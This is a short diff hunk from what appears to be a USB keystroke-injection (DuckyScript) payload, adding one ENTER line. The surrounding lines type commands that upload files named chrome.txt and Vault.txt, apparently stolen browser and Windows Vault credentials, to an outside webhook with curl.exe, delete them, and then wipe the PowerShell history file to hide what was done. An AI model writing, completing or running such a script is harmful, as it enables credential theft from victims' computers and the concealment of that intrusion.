@@ -38,6 +38,7 @@ STRING curl.exe -F "file1=@chrome.txt" $webhook; rm chrome.txt
 ENTER
 DELAY 500
 STRING curl.exe -F "file1=@Vault.txt" $webhook; rm Vault.txt
+ENTER
 REM Delete pwsh history
 DELAY 500
 STRING Remove-Item (Get-PSreadlineOption).HistorySavePath
